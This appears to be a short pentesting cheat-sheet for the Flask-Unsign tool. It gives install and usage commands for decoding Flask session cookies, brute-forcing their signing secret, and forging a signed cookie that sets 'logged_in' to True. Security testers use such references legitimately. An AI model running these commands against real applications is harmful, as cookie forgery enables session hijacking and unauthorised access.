- - -
**Tool Link :** **[https://github.com/Paradoxis/Flask-Unsign](https://github.com/Paradoxis/Flask-Unsign)**
Useful Refrence : [hacktricks.xyz](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask)
- - -

#### Installation :

```python
pip3 install flask-unsign
```

```python
flask-unsign
```

- - -
### Usage :

```python
flask-unsign --decode --server 'https://www.example.com/login'
```

```python
flask-unsign --unsign --cookie < cookie.txt # (Specified by us)
```

```python
flask-unsign --decode --cookie '.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'
```

```python
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME'
```

- - -
